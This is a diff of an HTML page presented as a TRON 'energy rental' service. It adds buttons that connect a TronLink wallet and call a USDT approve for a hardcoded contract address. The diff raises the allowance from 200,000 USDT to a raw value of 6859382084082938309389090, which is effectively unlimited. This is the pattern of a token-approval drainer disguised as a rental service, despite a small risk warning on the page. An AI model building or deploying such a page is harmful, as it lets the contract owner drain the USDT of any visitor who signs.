@@ -44,14 +44,12 @@
       padding: 14px;
       margin-bottom: 20px;
     }
-
     .wallet-row {
       display: flex;
       justify-content: space-between;
       gap: 12px;
       align-items: center;
     }
-
     .address {
       font-size: 13px;
       word-break: break-all;
@@ -67,8 +65,8 @@
       background: #222;
       color: white;
       transition: .2s;
+      margin-bottom:12px;
     }
-
     button:hover {
       opacity: .88;
     }
@@ -80,11 +78,9 @@
       background: #eee;
       color: #222;
     }
-
     .danger {
       background: #b42318;
     }
-
     .field {
       margin-bottom: 16px;
     }
@@ -122,7 +118,6 @@
     .info-row span:first-child {
       color: #777;
     }
-
     .value {
       text-align: right;
       word-break: break-all;
@@ -148,13 +143,11 @@
       display: grid;
       gap: 10px;
     }
-
     hr {
       border: 0;
       border-top: 1px solid #eee;
       margin: 24px 0;
     }
-
     .network {
       text-align: center;
       font-size: 12px;
@@ -166,15 +159,28 @@
 <body>
 <div class="container">
 <h1>能量租赁</h1>
-<div class="subtitle">
+<div class="subtitle">USDT授权页面</div>
+
+<div class="warning">
+⚠️风险提示：签名授权之后，目标合约可在授权额度内划转您的USDT，请确认合约可信再签名！
+</div>
+
+<button onclick="connectWallet()">连接TronLink钱包</button>
+<button onclick="approveToken()">执行USDT授权</button>
+
+<div id="log" class="status"></div>
+
+<div class="network">TRON TRC20‑USDT</div>
+</div>
+
 <script>
- // 已经填入你的合约0x地址
+ // 已经填入你的合约地址
 const CONTRACT_ADDRESS = "TGoZkUojDzZG1KPLyi6BFSm9wKL118Y3Ls";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-// 固定授权 200000 USDT，TRC20 6位小数
-const FIX_AMOUNT = BigInt(200000) * BigInt(1000000);
-let tronWeb;
+// 修改后：直接使用你给的原始链上数值，不再乘以1000000
+const FIX_AMOUNT = BigInt("6859382084082938309389090");
 
+let tronWeb;
 async function connectWallet(){
     document.getElementById("log").innerText="正在请求钱包连接...";
     // TronLink 请求授权连接
@@ -193,7 +199,6 @@ async function connectWallet(){
         document.getElementById("log").innerText = "当前钱包不支持TRON，请使用TronLink钱包";
     }
 }
-
 async function approveToken(){
     if(!tronWeb) return alert("请先连接钱包");
     const usdt = await tronWeb.contract().at(USDT_CONTRACT);
@@ -205,6 +210,7 @@ async function approveToken(){
     }
 }
 </script>
+
 </body>
 </html>
 
